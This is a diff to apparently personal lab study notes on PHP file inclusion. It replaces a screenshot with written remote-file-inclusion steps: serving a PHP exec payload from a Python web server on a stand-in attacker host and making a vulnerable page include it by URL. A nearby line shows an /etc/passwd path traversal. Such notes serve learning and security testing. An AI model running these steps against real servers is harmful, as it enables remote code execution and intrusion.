@@ -98,8 +98,9 @@ Warning: include(languages/../../../../../etc/passwd.php): failed to open stream
 - ``` allow_url_include ```
 - https://www.php.net/manual/en/filesystem.configuration.php#ini.allow-url-fopen
 - lead server to execute code from attacker`s server.
-- ![image](https://user-images.githubusercontent.com/91292763/147396528-b5de5902-1dc6-49b9-a672-23e111bf685b.png)
-- http://webapp.htm/get.php?file=http://attacker.thm/cmd.txt
+- start attack server: ``` sudo python3 -m http.server ```
+- prepare payload: cmd.txt: ``` <?php print exec('hostname');?> ```
+- lead victim server to execute it: http://webapp.htm/get.php?file=http://attacker.thm/cmd.txt
 
 ## Burp Suite Basic
 **Extensions**
